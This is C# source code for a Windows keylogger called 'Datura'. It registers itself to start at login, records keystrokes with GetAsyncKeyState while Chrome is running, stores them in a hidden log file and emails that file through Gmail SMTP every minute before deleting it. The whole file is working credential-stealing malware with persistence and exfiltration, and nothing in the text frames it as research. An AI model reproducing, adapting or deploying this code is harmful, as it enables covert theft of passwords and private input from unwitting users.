using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;
using Timer = System.Timers.Timer;


namespace Datura
{
    class Program
    {
        const short Delay = 50;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static StringBuilder key = new StringBuilder();


        static void Main(string[] args)
        {
            // The path to the key where Windows looks for startup applications
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            // Add the value in the registry so that the application runs at startup
            rkApp.SetValue("Datura", Application.ExecutablePath.ToString());

            //starts a thread for checking for chrome
            Thread chrome1 = new Thread(new ThreadStart(checker));
            chrome1.Start();

        }

        static void Start()
        {


            //creates the log file and sets it to be hidden
            string path = Application.StartupPath + "\\log.txt";
            if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);

            //timer for when file is sent its now at every 60 seconds
            Timer t = new Timer();
            t.Interval = 60000 * 1;
            t.Elapsed += Email;
            t.AutoReset = true;
            t.Enabled = true;


            int keysCount = Enum.GetValues(typeof(Keys)).Length;//Get the number of avaible keys.

            while (true)
            {
                for (int i = 0; i < keysCount; i++)//Loop for every key.
                    if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
                        key.Append(Enum.GetName(typeof(Keys), i));//Add key to keys.

                //If no key is pressed then wait x milliseconds.
                if (key.Length <= 0) Task.Delay(Delay).Wait();
                else
                {
                    //Key is pressed, continue.
                    //Ingenore LButton and RButton, these are mouse clicks.
                    if (key.Equals("LButton") || key.Equals("RButton")) { key.Clear(); continue; }

                    key.Replace("Enter", Environment.NewLine);//replaces enter with a new line
                    key.Replace("Space", " ");//replaces the space with a real space

                    File.AppendAllText(path, key.ToString());//writes the keys to a log file
                    File.SetAttributes(path, FileAttributes.Hidden);//sets attributes for finding the file
                    key.Clear();
                    
                }

            }

        }

        static void checker()
        {
            //thread for keylogger
            Thread keylog = new Thread(new ThreadStart(Start));

            int chrome2 = 8;
            int chrome = 8;
            //loops until sees that chrome window is open and starts the keylogger thread
            while (chrome2 > 6)
            {
                var RunningProcessPaths = ProcessFileNameFinderClass.GetAllRunningProcessFilePaths();
                if (RunningProcessPaths.Contains("chrome.exe"))
                {
                    keylog.Start();
                    chrome2 = 4;
                    Task.Delay(2000).Wait();
                }
                else
                {

                    chrome2 = 9;
                    Task.Delay(2000).Wait();
                }
            }

            //continues checking for chrome after first loop
            while (chrome > 6)
            {

                string a1 = keylog.ThreadState.ToString();
                string a2 = "Suspended";


                var RunningProcessPaths = ProcessFileNameFinderClass.GetAllRunningProcessFilePaths();
                if (RunningProcessPaths.Contains("chrome.exe"))
                {
                    if (a1.Contains(a2))
                    {
                        //if chrome is running and keylog is suspended it resumes it
                        keylog.Resume();
                        Task.Delay(2000).Wait();
                    }
                    else
                    {

                    }


                }
                else
                {
                    if (a1.Contains(a2))
                    {


                        Task.Delay(2000).Wait();
                    }
                    else
                    {
                        //if chrome is not running and keylog is not suspended it suspends it
                        keylog.Suspend();
                        Task.Delay(2000).Wait();
                    }


                }


            }
        }



        static void Email(Object source, ElapsedEventArgs e)
        {

            //path for file
            string path = Application.StartupPath + "\\log.txt";
            

            string date = DateTime.Now.ToString(@"dd\/MM h\:mm tt");
            try
            {

                //sending the file thru email
                MailMessage mail = new MailMessage();
                SmtpClient server = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("gmail");
                mail.To.Add("gmail");
                mail.Subject = "Log: " + WindowsIdentity.GetCurrent().Name + " time: " + date;

                //reading to content of file
                if (!File.Exists(path)) return;
                StreamReader r = new StreamReader(path);
                String content = r.ReadLine();
                r.Close();

                mail.Body = content;

                server.Port = 587;
                server.Credentials = new NetworkCredential("gmail", "pass");
                server.EnableSsl = true;
                server.Send(mail);

                // deleting the file after
                File.Delete(path);
            }
            catch (Exception ex)
            {
                
            }
        }
    }
}
